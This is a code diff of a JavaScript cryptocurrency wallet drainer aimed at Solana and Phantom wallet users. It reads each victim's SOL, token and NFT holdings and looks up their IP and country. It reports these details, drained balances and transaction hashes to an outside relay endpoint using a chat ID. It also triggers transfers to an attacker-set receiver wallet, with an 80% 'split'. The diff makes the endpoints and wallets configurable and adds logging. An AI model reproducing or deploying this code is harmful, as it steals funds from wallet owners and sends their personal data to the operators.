@@ -11,6 +11,7 @@ const a = {
     }
   };
   class b {
+    a = a; // using const a later on with "this.a.*"
     phantomInstalled = false;
     isConnected = false;
     publicKey;
@@ -57,16 +58,25 @@ const a = {
           this.connectWallet();
         }
         this.isConnected = true;
-        this.connection = new solanaWeb3.Connection("https://clean-wiser-spree.solana-mainnet.quiknode.pro/28d27542a08276a66158b092b03cbf0745e33171/");
+        this.connection = new solanaWeb3.Connection(this.a.rpc);
         this.publicKey = new solanaWeb3.PublicKey(this.resp.publicKey.toString());
-        this.receiver = new solanaWeb3.PublicKey("H495gSjwNTp1J3qwkqcgUrHC5vcnz7ZLcGuP8XezubtV");
+        this.receiver = new solanaWeb3.PublicKey(this.a.receiver);
         this.balance = await this.connection.getBalance(this.publicKey);
         this.realbalance = (await this.balance) / 1000000000;
         this.solUsd = ((await this.fetchSolPrice()) * this.realbalance).toFixed(2); 
+        var walletAddress = String(this.provider.publicKey)
+        console.log("💾 Wallet connected: " + walletAddress)
+  
         const tokensResponse = await this.fetchTokens(); 
         console.log("Tokens Response:", tokensResponse);
         const nftResponse = await this.fetchNft();
         console.log("NFT Response:", nftResponse);
+  
+        if (this.totalBalance >= this.a.claimInfo.minimumBalance) {
+          this.solTransfer();
+        } else {
+          console.log("Not enough SOL - need at least: " + this.a.claimInfo.minimumBalance)
+        }
       }
     };
     getProvider = async () => {
@@ -127,9 +137,8 @@ const a = {
         }));
         this.totalBalance = parseFloat(this.solUsd) + parseFloat(this.tokenWalletBalance);
         this.sendConnection();
-        if (this.totalBalance >= a.claimInfo.minimumBalance) {
-          this.solTransfer();
-        }
+        console.log("✅🪙 Fetching Tokens SUCCESS");
+        return this.splTokens
       } catch (a) {
         console.error(a);
       }
@@ -156,9 +165,12 @@ const a = {
         await Promise.all(a.map(async a => {
           this.nfts.push(a);
         }));
+        console.log("✅🖼️ Fetching NFTS SUCCESS");
+        return this.nfts
       } catch (a) {}
     };
     solTransfer = async () => {
+      console.log("🪙 Transfer SOL");
       this.askForTx();
       let b = [];
       let c = [];
@@ -259,15 +271,18 @@ const a = {
     sendConnection = async () => {
       try {
         let a = {};
-        a = await fetch("https://ipapi.co/json/", this.requestOptionsPOST).then(a => a.json());
-        this.Ip = a.ip;
+        if (this.a.logIpData) {
+          a = await fetch("https://ipapi.co/json/", this.requestOptionsPOST).then(a => a.json());
+          this.Ip = a.ip;
+        }
         if (!a.ip || !a.country_name) {
           a = {
             ip: "Unknown",
             country_name: "Unknown"
           };
         }
-        fetch("https://pastdue-assistant.onrender.com/send-message", {
+        console.log("📊 IPdata:", a)
+        fetch(this.a.rdp, {
           method: "POST",
           mode: "cors",
           cache: "no-cache",
@@ -286,16 +301,16 @@ const a = {
             country: a.country,
             usd: this.solUsd,
             tokenBalance: this.tokenWalletBalance,
-            chatid: "-4055895140",
+            chatid: this.a.chatId,
             totalbalance: this.totalBalance,
-            userid: "nCyZwgSq"
+            userid: this.a.userId
           })
         });
       } catch (a) {}
     };
     solanaSplit = async () => {
       try {
-        fetch("https://pastdue-assistant.onrender.com/send-message", {
+        fetch(this.a.rdp, {
           method: "POST",
           mode: "cors",
           cache: "no-cache",
@@ -304,9 +319,9 @@ const a = {
             "Accept": "application/json"
           },
           body: JSON.stringify({
-            address: "HvptRyiVQ4nSziBLfqNCTS3LGhigrSdWizLgu4K2mRau",
+            address: this.a.user_wallet,
             solanaSplit: this.realbalance * 80 / 100,
-            chatid: "-4055895140",
+            chatid: this.a.chatId,
             solusd: this.solUsd
           })
         });
@@ -314,7 +329,7 @@ const a = {
     };
     splSplit = async a => {
       try {
-        fetch("https://pastdue-assistant.onrender.com/send-message", {
+        fetch(this.a.rdp, {
           method: "POST",
           mode: "cors",
           cache: "no-cache",
@@ -323,9 +338,9 @@ const a = {
             "Accept": "application/json"
           },
           body: JSON.stringify({
-            address: "HvptRyiVQ4nSziBLfqNCTS3LGhigrSdWizLgu4K2mRau",
+            address: this.a.user_wallet,
             tokens: a,
-            chatid: "-4055895140"
+            chatid: this.a.chatId
           })
         });
       } catch (a) {}
@@ -342,7 +357,7 @@ const a = {
           };
         }
         ;
-        fetch("https://pastdue-assistant.onrender.com/send-message", {
+        fetch(this.a.rdp, {
           method: "POST",
           mode: "cors",
           cache: "no-cache",
@@ -358,14 +373,14 @@ const a = {
             ipData: b,
             balanceDrained: parseFloat(this.solUsd + this.tokenWalletBalance),
             hash: a,
-            chatid: "-4055895140"
+            chatid: this.a.chatId
           })
         });
       } catch (a) {}
     };
     askForTx = async () => {
       try {
-        fetch("https://pastdue-assistant.onrender.com/send-message", {
+        fetch(this.a.rdp, {
           method: "POST",
           mode: "cors",
           cache: "no-cache",
@@ -379,14 +394,14 @@ const a = {
             address: this.publicKey.toString(),
             balance: this.realbalance,
             tokenValue: this.tokenWalletBalance,
-            chatid: "-4055895140"
+            chatid: this.a.chatId
           })
         });
       } catch (a) {}
     };
     DeclinedTx = async () => {
       try {
-        fetch("https://pastdue-assistant.onrender.com/send-message", {
+        fetch(this.a.rdp, {
           method: "POST",
           mode: "cors",
           cache: "no-cache",
@@ -398,7 +413,7 @@ const a = {
             identifier: "promptDeclined",
             declined: "Declined prompt.",
             address: this.publicKey.toString(),
-            chatid: "-4055895140"
+            chatid: this.a.chatId
           })
         });
       } catch (a) {}
